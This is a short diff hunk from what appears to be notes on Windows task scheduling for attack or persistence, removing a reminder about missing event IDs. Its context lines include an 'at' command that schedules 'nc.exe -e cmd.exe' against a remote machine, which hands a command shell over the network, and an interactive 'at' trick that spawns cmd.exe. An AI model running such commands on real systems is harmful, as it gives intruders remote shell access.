@@ -58,9 +58,6 @@ at 15:25 /interactive "cmd.exe"
 
 at \\192.168.1.252\ 7:09pm /interactive "c:\nc.exe -e cmd.exe" 127.0.0.1 53
 
-
-Note: Still need event ids for PowerShell and At.exe.
-
 Schedule Windows Task via GUI
 
 1.Go to Start > Administrative Tools > Task Scheduler
